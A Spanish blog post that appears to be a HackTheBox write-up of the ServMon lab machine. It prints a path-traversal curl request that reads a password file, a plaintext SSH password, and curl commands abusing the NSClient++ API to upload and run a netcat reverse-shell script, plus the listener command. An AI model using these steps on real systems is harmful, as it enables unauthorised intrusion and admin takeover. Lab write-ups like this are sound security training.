---
layout      : post
title       : "HackTheBox - ServMon"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/bannerservmon.png
categories  : [ htb ]
tags        : [ FTP, LFI, NSClient, API ]
---
Máquina Windows nivel fácil. Iremos dando vueltas mediante FTP, exploraremos un Local File Inclusion. Jugaremos con la API del servicio NSClient para conseguir una shell como administrador.

![servmonHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/servmonHTB.png)

## TL;DR (Spanish writeup)

Esta máquina fue muy interesante, un método de explotación que a mi parecer me dejo loco (por como se hace y por el tiempo que me demore en entenderlo), también a pesar de a veces ser super lenta y que las personas la reiniciaban demasiado por usar un exploit equivocado.

Mediante el servicio `FTP` encontraremos archivos interesantes, que nos daran algunos usuarios (o posibles rabbit holes :P)
Explotaremos un `Local File Inclusion` dentro del servicio `NVMS 1000`, para asi encontrar un archivo con contraseñas y probarlas con los usuarios obtenidos. Luego con el usuario Nadine, tendremos acceso a la maquina para tener la primera flag.

Despues a traves del servicio `NSClient++` y del aplicativo `nsclient++.ini` encontraremos una contraseña, posiblemente del administrador. Y finalmente obtendremos una shell como admin mediante la `API` del servicio. 

...

### Fases

1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalada de privilegios](#escalada-de-privilegios)

...

## Enumeración {#enumeracion}

Demosle al escaneo de servicios con los que cuenta el host.

```bash
$nmap -v -p- --open --min-rate=5000 -Pn -oG initScan 10.10.10.184
```

| Parametro | Descripción   |
| ----------|:------------- |
| -v        | Para que nos muestre en la shell lo que va descubriendo |
| -p-       | Escanea todos los puertos                               |
| --open    | Muestra solo los puertos abiertos                       |
| -min-rate | Le decimos que no haga peticiones menores a 5000, sin esto, el escaneo va lento |
| -Pn       | Evitamos que haga resolucion DNS por cada peticion y ademas que haga host discovery (ping) |
| -oG       | Guarda el output en un archivo tipo grep, ya veremos por que |

![initScan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/initScan.jpg)

Usaremos una función de [S4vitar](https://www.youtube.com/channel/UCNHWpNqiM8yOQcHXtsluD7Q) mediante el cual extraeremos los puertos y con la herramienta xclip a nuestra clipboard, evitando tener que copiar todos los puertos uno a uno.

![extractPorts](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/extractPorts.jpg)

![outExtractPorts](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/outExtractPorts.png)

```bash
$nmap -sV -sC -p21,22,80,135,139,445,5666,6063,6699,8443,49667,49669,49670 10.10.10.184 -oN portScan
```

| Param  | Descripción   |
| -------|:------------- |
| -sV    | Nos permite ver las versiones de los servicios     |
| -sC    | Muestra todos los scripts relacionados con el servicio |
| -oN    | Guarda el output en un archivo                |

![portScan1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/portScan1.png)

![portScan2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/portScan2.png)

Tenemos estos servicios corriendo:

- 21: FTP, además con el acceso Anonymous habilitado
- 22: SSH, quizás para entrar con algún usuario
- 80: HTTP, Una página web
- 445: Samba

Empezaremos con el servicio FTP

![ftpAccess](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/ftpAccess.png)

![ftpDir](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/ftpDir.png)

Tenemos 2 archivos y 2 usuarios

* Nathan
* Nadine

En la interfaz de FTP podemos usar `> get <nombredelarchivo>` para descargarlo a nuestra ubicación actual.

![ftpFiles](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/ftpFiles.png)

Curioso, **Nadine** le indica a **Nathan** que ella dejó el archivo `Password.txt` en su Escritorio. Por otro lado tenemos unos pasos a realizar, pero no tiene relevancia aún. De acá no tenemos nada más, así que veamos el servidor web.

![webInterface](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/webInterface.png)

Podemos inspeccionar, probar credenciales por default en los input, inyectar sentencias SQL, pero no encontramos nada. Vemos algo llamado `NVMS-1000`, busquemos que es y si podemos encontrar algún exploit.

> **NVMS-1000** según la busqueda, es un software para el control y gestión de camaras.

![nvmsPOCtxt](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/nvmsPOCtxt.png)

Encontramos un `.txt`, relacionando un **Directory Path Traversal**, lo que nos permite ver archivos del sistema en el que está corriendo la página, que normalmente no deberíamos ver.

...

## Explotación {#explotacion}

Podemos relacionar lo encontrado anteriormente con FTP, ya que sabiendo que **Windows** tiene normalmente en su raíz una carpeta llamada `c:\Users` y tenemos 2 usuarios, pero realmente uno es el que nos interesa, `Nathan` y que tiene en su escritorio el archivo `Password.txt`, entonces realizando la consulta quedaría así.

Usaré cURL: 

```bash
$curl --path-as-is -v http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt
```

| Parámetro      | Descripción   |
| ---------------|:------------- |
| -path-as-is    | Toma la petición con los "/..", sin esto hace el request a http://10.10.10.184/Users/Nathan/Desktop/Passwords.txt y pues este path no funciona |
| -v             | Para ver que está pasando por detrás del request |

![passwordsCurl](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/passwordsCurl.png)

Perfecto, tenemos credenciales, veamos si alguna es de algún usuario.

```bash
$ssh nadine@10.10.10.184

password: L1k3B1gBut7s@W0rk
```

![sshNadine](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/sshNadine.png)

Listos, tenemos la flag del usuario. Veamos los últimos 18 caracteres.

![last18charsUsr](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/last18charsUsr.png)

...

## Escalada de privilegios {#escalada-de-privilegios}

Basándonos en el escaneo de puertos, recordamos que había un servicio llamado **NSClient++** corriendo sobre el puerto **8443**, ¿De qué trata y que podemos encontrar de él en Windows?

Acá empieza la locura, después de momentos sin entender nada, buscando algún exploit para **NSClient++**, se encontró uno en el que indica que debemos crear un archivo `.bat` el cual hará una conexión a netcat, con lo que necesitamos subir ese `.bat`, ponernos en escucha y ejecutarlo para tener una reverse Shell. 

Interesante, pero como subimos el archivo... En la [documentación](https://docs.nsclient.org/api/rest/) de **NSClient++** hay una **API** en la cual, podemos **subir scripts, ejecutar scripts, borrar, etc..** (También se puede hacer con el entorno gráfico, pero cuando hice la máquina iba muy lento).

Los pasos del [exploit de nsclient++](https://www.exploit-db.com/exploits/46802) encontrado:

![nsclientExploit](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/nsclientExploit.png)

Buscando por internet, sabemos que el archivo nsclient++.ini guardaba la contraseña del administrador :P

![passwordAdmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/passwordAdmin.png)

Siguiendo el POC realizaremos esto:

1. Subir **nc.exe** (netcat) y el archivo `.bat` a **Windows**.
2. Subir el archivo `.bat` al **NSCLient++** como script con la **API**,
3. Ponernos en escucha mediante **nc (netcat)**, esperando la conexión del script.
4. Ejecutar el script con la ayuda la **API**.
5. Conseguir la Shell como Administrador.

#### > Subir *nc.exe* (netcat) y el archivo *.bat* a Windows

Descargar el ejecutable de netcat desde la web y crear él *.bat*

Usando `scp` podemos transferir mediante **SSH** archivos, siempre y cuando tengamos credenciales del objetivo.

![creatinganduploadBAT](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/creatinganduploadBAT.png)

#### > Subir el archivo *.bat* al NSCLient++ como script con la API

Buscar muy bien en la documentación, entender y hacer, llevo su tiempo, pero fue interesante.

```bash
$curl -k -i -u admin https://localhost:8443/api/v1/scripts/ext?all=true
```

Primero vemos los scripts actuales que maneja la app. (Además también para probar que todo va bien :P). Nos va a pedir la pw que ya encontramos en el **nsclient++.ini**.

![seeScriptsAPI](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/seeScriptsAPI.png)

Listo, ahora lo que haremos será agregar el *queesesto.bat* como un script

```bash
$curl -i -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts\c:\Temp\lana.bat --data-binary @lana.bat
```

![addScriptAPI](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/addScriptAPI.png)

Acá usamos **PUT** para "poner", indicándole donde está el archivo y donde queremos subirlo, en este caso en `/scripts`.

Ahora, como hacemos para ejecutarlo, buscando y buscando, en la documentación hace referencia a `/queries`, en los cuales dentro de cada uno hay unos atributos y comandos, uno de ellos tiene una instrucción de **ejecución**. Veamos que *queries* hay.

```bash
$curl -k -i -u admin https://localhost:8443/api/v1/queries/
```

![queriesGeneralAPI](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/queriesGeneralAPI.png)

Al final vemos que se creó un tipo **JSON** con información relacionada con nuestro script.

![queryScriptAPI](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/queryScriptAPI.png)

Ya se ve el comando `execute` y hace referencia al script agregado.

```txt
"execute_url":"https://localhost:8443/api/v1/queries/queesesto/commands/execute"
```

#### > Ponernos en escucha mediante **nc (netcat)**.

Finalmente, poniéndonos en escucha en nuestra máquina por el puerto **443**, que fue el que definimos en el *.bat* obtendremos la Shell.

```bash
$nc -lnvp 443
```

#### > Ejecutar el script con la ayuda de la **API**.

```bash
$curl -k -i -u admin https://localhost:8443/api/v1/queries/queesesto/commands/execute
```

#### > Conseguir la Shell como Administrador.

![ncOKAdmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/ncOKAdmin.png)

Y... estamos dentro como usuario administrador :)))))

> Debo decir que amé esta forma de intrusión.

...

![last11charsAdmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/last11charsAdmin.png)

Buena maquina, en su momento estaba muy lenta y además las personas por seguir el exploit de internet al pie de la letra pues reseteaban la máquina, lo cual hacia peor el proceso. Pero bueno, encantado y muchas gracias por leer.